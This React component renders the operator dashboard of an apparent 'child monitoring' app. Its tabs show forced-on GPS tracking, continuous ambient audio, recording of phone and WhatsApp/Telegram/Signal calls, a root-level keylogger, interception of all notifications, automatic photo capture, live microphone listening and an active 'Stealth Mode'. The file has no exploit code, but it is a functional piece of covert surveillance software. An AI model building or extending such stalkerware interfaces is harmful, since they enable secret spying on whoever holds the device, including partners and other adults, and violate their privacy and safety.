import { useState } from 'react'
import type { ChildData } from '../lib/supabase'

interface MonitoringTabsProps {
  data: ChildData | null
  loading: boolean
  timeRange: string
  realTimeData?: any
  isLiveMonitoring?: boolean
}

export default function MonitoringTabs({ data, loading, realTimeData, isLiveMonitoring }: MonitoringTabsProps) {
  const [activeTab, setActiveTab] = useState('overview')

  const tabs = [
    { id: 'overview', name: 'Overview', icon: '📊' },
    { id: 'locations', name: 'GPS Tracking', icon: '📍' },
    { id: 'audio', name: 'Audio Recordings', icon: '🎤' },
    { id: 'calls', name: 'Call Recordings', icon: '📞' },
    { id: 'keylogger', name: 'Keylogger', icon: '⌨️' },
    { id: 'notifications', name: 'Notifications', icon: '🔔' },
    { id: 'media', name: 'Photos & Media', icon: '📸' },
    { id: 'live', name: 'Live Monitoring', icon: '📡' }
  ]

  const formatTime = (dateString: string) => {
    return new Date(dateString).toLocaleString()
  }

  const renderOverview = () => (
    <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
      <div>
        <h4 className="text-lg font-semibold mb-4">Real-time Activity Feed</h4>
        <div className="space-y-2 max-h-96 overflow-y-auto">
          {loading ? (
            [...Array(5)].map((_, i) => (
              <div key={i} className="flex items-center p-2 border-l-4 border-gray-200 animate-pulse">
                <div className="w-4 h-4 bg-gray-200 rounded-full mr-3"></div>
                <div className="flex-1">
                  <div className="h-4 bg-gray-200 rounded w-3/4 mb-1"></div>
                  <div className="h-3 bg-gray-200 rounded w-1/2"></div>
                </div>
              </div>
            ))
          ) : (
            <>
              {data?.locations?.slice(0, 3).map((loc, i) => (
                <div key={i} className="flex items-center p-2 border-l-4 border-blue-200 hover:bg-gray-50">
                  <div className="w-4 h-4 bg-blue-500 rounded-full mr-3"></div>
                  <div className="flex-1">
                    <p className="text-sm">Location updated: {loc.lat.toFixed(4)}, {loc.lng.toFixed(4)}</p>
                    <p className="text-xs text-gray-500">{formatTime(loc.recorded_at)}</p>
                  </div>
                </div>
              ))}
              {data?.audioClips?.slice(0, 2).map((audio, i) => (
                <div key={i} className="flex items-center p-2 border-l-4 border-green-200 hover:bg-gray-50">
                  <div className="w-4 h-4 bg-green-500 rounded-full mr-3"></div>
                  <div className="flex-1">
                    <p className="text-sm">Audio recorded: {audio.duration_s}s</p>
                    <p className="text-xs text-gray-500">{formatTime(audio.recorded_at)}</p>
                  </div>
                </div>
              ))}
              {data?.callRecordings?.slice(0, 2).map((call, i) => (
                <div key={i} className="flex items-center p-2 border-l-4 border-red-200 hover:bg-gray-50">
                  <div className="w-4 h-4 bg-red-500 rounded-full mr-3"></div>
                  <div className="flex-1">
                    <p className="text-sm">{call.call_type} call: {call.phone_number}</p>
                    <p className="text-xs text-gray-500">{formatTime(call.start_time)}</p>
                  </div>
                </div>
              ))}
            </>
          )}
        </div>
      </div>
      
      <div>
        <h4 className="text-lg font-semibold mb-4">System Status</h4>
        <div className="space-y-3">
          {[
            { name: 'GPS Tracking', status: 'ACTIVE', color: 'green' },
            { name: 'Audio Recording', status: 'ACTIVE', color: 'green' },
            { name: 'Call Recording', status: 'ACTIVE', color: 'green' },
            { name: 'Keylogger', status: 'ACTIVE', color: 'green' },
            { name: 'Stealth Mode', status: 'ACTIVE', color: 'green' }
          ].map((item, i) => (
            <div key={i} className="flex justify-between items-center p-3 bg-green-50 rounded">
              <span className="font-medium">{item.name}</span>
              <span className={`text-${item.color}-600 font-semibold`}>{item.status}</span>
            </div>
          ))}
        </div>
      </div>
    </div>
  )

  const renderLocations = () => (
    <div>
      <h4 className="text-lg font-semibold mb-4">Location History (GPS Forced On)</h4>
      <div className="space-y-2">
        {loading ? (
          [...Array(3)].map((_, i) => (
            <div key={i} className="p-4 border rounded-lg animate-pulse">
              <div className="h-4 bg-gray-200 rounded w-1/2 mb-2"></div>
              <div className="h-3 bg-gray-200 rounded w-1/3 mb-1"></div>
              <div className="h-3 bg-gray-200 rounded w-1/4"></div>
            </div>
          ))
        ) : (
          data?.locations?.map((loc, i) => (
            <div key={i} className="p-4 border rounded-lg">
              <div className="flex justify-between items-start">
                <div>
                  <p className="font-semibold">{loc.lat.toFixed(6)}, {loc.lng.toFixed(6)}</p>
                  <p className="text-sm text-gray-600">Accuracy: {loc.accuracy}m</p>
                  <p className="text-xs text-gray-500">{formatTime(loc.recorded_at)}</p>
                </div>
                <button 
                  className="text-blue-600 hover:text-blue-800"
                  onClick={() => window.open(`https://maps.google.com/?q=${loc.lat},${loc.lng}`, '_blank')}
                >
                  <svg className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" />
                  </svg>
                </button>
              </div>
            </div>
          ))
        )}
      </div>
    </div>
  )

  const renderAudioRecordings = () => (
    <div>
      <h4 className="text-lg font-semibold mb-4">Audio Recordings (1-Hour Continuous)</h4>
      <div className="mb-4 p-4 bg-blue-50 rounded-lg">
        <div className="flex items-center">
          <span className="text-2xl mr-3">🎤</span>
          <div>
            <h5 className="font-medium text-gray-900">Continuous Recording Active</h5>
            <p className="text-sm text-gray-600">Recording surroundings every hour with timestamp</p>
          </div>
        </div>
      </div>
      <div className="space-y-2">
        {loading ? (
          [...Array(3)].map((_, i) => (
            <div key={i} className="p-4 border rounded-lg animate-pulse">
              <div className="h-4 bg-gray-200 rounded w-1/2 mb-2"></div>
              <div className="h-3 bg-gray-200 rounded w-1/3 mb-1"></div>
              <div className="h-3 bg-gray-200 rounded w-1/4"></div>
            </div>
          ))
        ) : (
          data?.audioClips?.map((audio, i) => (
            <div key={i} className="p-4 border rounded-lg">
              <div className="flex justify-between items-start">
                <div>
                  <p className="font-semibold">Audio Recording #{audio.id}</p>
                  <p className="text-sm text-gray-600">Duration: {audio.duration_s} seconds</p>
                  <p className="text-sm text-gray-600">File: {audio.path}</p>
                  <p className="text-xs text-gray-500">{formatTime(audio.recorded_at)}</p>
                </div>
                <div className="flex space-x-2">
                  <button className="text-blue-600 hover:text-blue-800">
                    <svg className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14.828 14.828a4 4 0 01-5.656 0M9 10h1m4 0h1m-6 4h.01M15 14h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                  </button>
                  <button className="text-green-600 hover:text-green-800">
                    <svg className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 10v6m0 0l-3-3m3 3l3-3m2 8H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                    </svg>
                  </button>
                </div>
              </div>
            </div>
          ))
        )}
      </div>
    </div>
  )

  const renderCalls = () => (
    <div>
      <h4 className="text-lg font-semibold mb-4">Call Recordings (Phone + VoIP)</h4>
      <div className="mb-4 p-4 bg-red-50 rounded-lg">
        <div className="flex items-center">
          <span className="text-2xl mr-3">📞</span>
          <div>
            <h5 className="font-medium text-gray-900">VoIP Call Recording Active</h5>
            <p className="text-sm text-gray-600">Recording WhatsApp, Telegram, Signal, and all phone calls</p>
          </div>
        </div>
      </div>
      <div className="space-y-2">
        {loading ? (
          [...Array(3)].map((_, i) => (
            <div key={i} className="p-4 border rounded-lg animate-pulse">
              <div className="h-4 bg-gray-200 rounded w-1/2 mb-2"></div>
              <div className="h-3 bg-gray-200 rounded w-1/3 mb-1"></div>
              <div className="h-3 bg-gray-200 rounded w-1/4"></div>
            </div>
          ))
        ) : (
          data?.callRecordings?.map((call, i) => (
            <div key={i} className="p-4 border rounded-lg">
              <div className="flex justify-between items-start">
                <div>
                  <p className="font-semibold">{call.phone_number}</p>
                  <p className="text-sm text-gray-600">{call.call_type} call</p>
                  <p className="text-sm text-gray-600">Duration: {call.duration_seconds}s</p>
                  <p className="text-xs text-gray-500">{formatTime(call.start_time)}</p>
                </div>
                {call.recording_path && (
                  <button className="text-green-600 hover:text-green-800">
                    <svg className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14.828 14.828a4 4 0 01-5.656 0M9 10h1m4 0h1m-6 4h.01M15 14h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                  </button>
                )}
              </div>
            </div>
          ))
        )}
      </div>
    </div>
  )

  const renderKeylogger = () => (
    <div>
      <h4 className="text-lg font-semibold mb-4">Keylogger Data (System-Level)</h4>
      <div className="mb-4 p-4 bg-orange-50 rounded-lg">
        <div className="flex items-center">
          <span className="text-2xl mr-3">⌨️</span>
          <div>
            <h5 className="font-medium text-gray-900">System-Level Keylogger Active</h5>
            <p className="text-sm text-gray-600">Recording everything typed across all apps (requires root access)</p>
          </div>
        </div>
      </div>
      <div className="space-y-2">
        {loading ? (
          [...Array(3)].map((_, i) => (
            <div key={i} className="p-4 border rounded-lg animate-pulse">
              <div className="h-4 bg-gray-200 rounded w-1/2 mb-2"></div>
              <div className="h-3 bg-gray-200 rounded w-1/3 mb-1"></div>
              <div className="h-3 bg-gray-200 rounded w-1/4"></div>
            </div>
          ))
        ) : (
          data?.keyloggerData?.map((key, i) => (
            <div key={i} className="p-4 border rounded-lg">
              <div className="flex justify-between items-start">
                <div>
                  <p className="font-semibold">{key.app_name || 'Unknown App'}</p>
                  <p className="text-sm text-gray-600">{key.activity_type}</p>
                  <p className="text-sm text-gray-600">Input: {key.input_method}</p>
                  <p className="text-sm text-gray-600">Session: {key.session_duration}s</p>
                  <p className="text-xs text-gray-500">{formatTime(key.timestamp)}</p>
                </div>
                <div className="text-xs text-gray-500">
                  {key.content_preview}
                </div>
              </div>
            </div>
          ))
        )}
      </div>
    </div>
  )

  const renderNotifications = () => (
    <div>
      <h4 className="text-lg font-semibold mb-4">Captured Notifications (All Apps)</h4>
      <div className="mb-4 p-4 bg-yellow-50 rounded-lg">
        <div className="flex items-center">
          <span className="text-2xl mr-3">🔔</span>
          <div>
            <h5 className="font-medium text-gray-900">Notification Interception Active</h5>
            <p className="text-sm text-gray-600">Capturing all notifications from WhatsApp, SMS, and all apps</p>
          </div>
        </div>
      </div>
      <div className="space-y-2">
        {loading ? (
          [...Array(3)].map((_, i) => (
            <div key={i} className="p-4 border rounded-lg animate-pulse">
              <div className="h-4 bg-gray-200 rounded w-1/2 mb-2"></div>
              <div className="h-3 bg-gray-200 rounded w-1/3 mb-1"></div>
              <div className="h-3 bg-gray-200 rounded w-1/4"></div>
            </div>
          ))
        ) : (
          data?.notifications?.map((notif, i) => (
            <div key={i} className="p-4 border rounded-lg">
              <div className="flex justify-between items-start">
                <div>
                  <p className="font-semibold">{notif.app}</p>
                  <p className="text-sm text-gray-600">{notif.title}</p>
                  <p className="text-sm text-gray-600">{notif.body}</p>
                  <p className="text-xs text-gray-500">{formatTime(notif.received_at)}</p>
                </div>
              </div>
            </div>
          ))
        )}
      </div>
    </div>
  )


  const renderMediaFiles = () => (
    <div>
      <h4 className="text-lg font-semibold mb-4">Photos & Media Captured</h4>
      <div className="mb-4 p-4 bg-indigo-50 rounded-lg">
        <div className="flex items-center">
          <span className="text-2xl mr-3">📸</span>
          <div>
            <h5 className="font-medium text-gray-900">Photo Capture Active</h5>
            <p className="text-sm text-gray-600">Automatically capturing all pictures taken with the device</p>
          </div>
        </div>
      </div>
      <div className="space-y-2">
        {loading ? (
          [...Array(3)].map((_, i) => (
            <div key={i} className="p-4 border rounded-lg animate-pulse">
              <div className="h-4 bg-gray-200 rounded w-1/2 mb-2"></div>
              <div className="h-3 bg-gray-200 rounded w-1/3 mb-1"></div>
              <div className="h-3 bg-gray-200 rounded w-1/4"></div>
            </div>
          ))
        ) : (
          data?.mediaItems?.map((media, i) => (
            <div key={i} className="p-4 border rounded-lg">
              <div className="flex justify-between items-start">
                <div>
                  <p className="font-semibold">{media.kind}</p>
                  <p className="text-sm text-gray-600">Path: {media.path}</p>
                  <p className="text-xs text-gray-500">{formatTime(media.taken_at)}</p>
                </div>
              </div>
            </div>
          ))
        )}
      </div>
    </div>
  )


  const renderLiveMonitoring = () => (
    <div className="space-y-6">
      <div className="text-center">
        <h3 className="text-lg font-semibold text-gray-900 mb-2">Real-Time Live Monitoring</h3>
        <p className="text-gray-600">Monitor your child's device in real-time with instant updates</p>
      </div>

      {!isLiveMonitoring ? (
        <div className="text-center py-12">
          <div className="mx-auto h-16 w-16 flex items-center justify-center rounded-full bg-gray-100 mb-4">
            <svg className="h-8 w-8 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z" />
            </svg>
          </div>
          <h4 className="text-lg font-medium text-gray-900 mb-2">Live Monitoring Inactive</h4>
          <p className="text-gray-600 mb-4">Start live monitoring to see real-time data from your child's device</p>
        </div>
      ) : (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          {/* Real-time Location */}
          <div className="bg-blue-50 rounded-lg p-4">
            <div className="flex items-center mb-3">
              <span className="text-2xl mr-2">📍</span>
              <h4 className="font-semibold text-gray-900">Current Location</h4>
              <div className="ml-auto w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
            </div>
            {realTimeData?.location ? (
              <div>
                <p className="text-sm text-gray-600">
                  Lat: {realTimeData.location.lat.toFixed(6)}
                </p>
                <p className="text-sm text-gray-600">
                  Lng: {realTimeData.location.lng.toFixed(6)}
                </p>
                <p className="text-xs text-gray-500 mt-2">
                  Updated: {formatTime(realTimeData.location.recorded_at)}
                </p>
              </div>
            ) : (
              <p className="text-gray-500 text-sm">Waiting for location data...</p>
            )}
          </div>

          {/* Real-time Audio */}
          <div className="bg-green-50 rounded-lg p-4">
            <div className="flex items-center mb-3">
              <span className="text-2xl mr-2">🎤</span>
              <h4 className="font-semibold text-gray-900">Audio Recording</h4>
              <div className="ml-auto w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
            </div>
            {realTimeData?.audio ? (
              <div>
                <p className="text-sm text-gray-600">
                  Duration: {realTimeData.audio.duration_s}s
                </p>
                <p className="text-xs text-gray-500 mt-2">
                  Recorded: {formatTime(realTimeData.audio.recorded_at)}
                </p>
              </div>
            ) : (
              <p className="text-gray-500 text-sm">No recent audio recordings</p>
            )}
          </div>

          {/* Real-time Notifications */}
          <div className="bg-yellow-50 rounded-lg p-4">
            <div className="flex items-center mb-3">
              <span className="text-2xl mr-2">🔔</span>
              <h4 className="font-semibold text-gray-900">Latest Notification</h4>
              <div className="ml-auto w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
            </div>
            {realTimeData?.notification ? (
              <div>
                <p className="text-sm font-medium text-gray-900">
                  {realTimeData.notification.app}
                </p>
                <p className="text-sm text-gray-600">
                  {realTimeData.notification.title}
                </p>
                <p className="text-xs text-gray-500 mt-2">
                  {formatTime(realTimeData.notification.received_at)}
                </p>
              </div>
            ) : (
              <p className="text-gray-500 text-sm">No recent notifications</p>
            )}
          </div>

          {/* Live Listening Controls */}
          <div className="bg-purple-50 rounded-lg p-4">
            <div className="flex items-center mb-3">
              <span className="text-2xl mr-2">🎧</span>
              <h4 className="font-semibold text-gray-900">Live Listening</h4>
            </div>
            <div className="space-y-2">
              <button className="w-full bg-purple-600 text-white px-4 py-2 rounded-lg text-sm font-medium hover:bg-purple-700 transition-colors">
                Start Live Listening
              </button>
              <p className="text-xs text-gray-500">
                Listen to device microphone in real-time
              </p>
            </div>
          </div>
        </div>
      )}

      {/* Monitoring Status */}
      <div className="bg-gray-50 rounded-lg p-4">
        <h4 className="font-semibold text-gray-900 mb-3">Monitoring Status</h4>
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
          <div className="text-center">
            <div className={`w-3 h-3 rounded-full mx-auto mb-1 ${isLiveMonitoring ? 'bg-green-400' : 'bg-gray-300'}`}></div>
            <p className="text-xs text-gray-600">Live Monitoring</p>
          </div>
          <div className="text-center">
            <div className="w-3 h-3 rounded-full mx-auto mb-1 bg-green-400"></div>
            <p className="text-xs text-gray-600">GPS Tracking</p>
          </div>
          <div className="text-center">
            <div className="w-3 h-3 rounded-full mx-auto mb-1 bg-green-400"></div>
            <p className="text-xs text-gray-600">Audio Recording</p>
          </div>
          <div className="text-center">
            <div className="w-3 h-3 rounded-full mx-auto mb-1 bg-green-400"></div>
            <p className="text-xs text-gray-600">Stealth Mode</p>
          </div>
        </div>
      </div>
    </div>
  )

  const renderTabContent = () => {
    switch (activeTab) {
      case 'overview': return renderOverview()
      case 'locations': return renderLocations()
      case 'audio': return renderAudioRecordings()
      case 'calls': return renderCalls()
      case 'keylogger': return renderKeylogger()
      case 'notifications': return renderNotifications()
      case 'media': return renderMediaFiles()
      case 'live': return renderLiveMonitoring()
      default: return renderOverview()
    }
  }

  return (
    <div className="card">
      <div className="border-b border-gray-200">
        <nav className="-mb-px flex space-x-8">
          {tabs.map((tab) => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`py-4 px-1 border-b-2 font-medium text-sm ${
                activeTab === tab.id
                  ? 'border-blue-500 text-blue-600'
                  : 'border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300'
              }`}
            >
              <span className="mr-2">{tab.icon}</span>
              {tab.name}
            </button>
          ))}
        </nav>
      </div>

      <div className="p-6">
        {renderTabContent()}
      </div>
    </div>
  )
}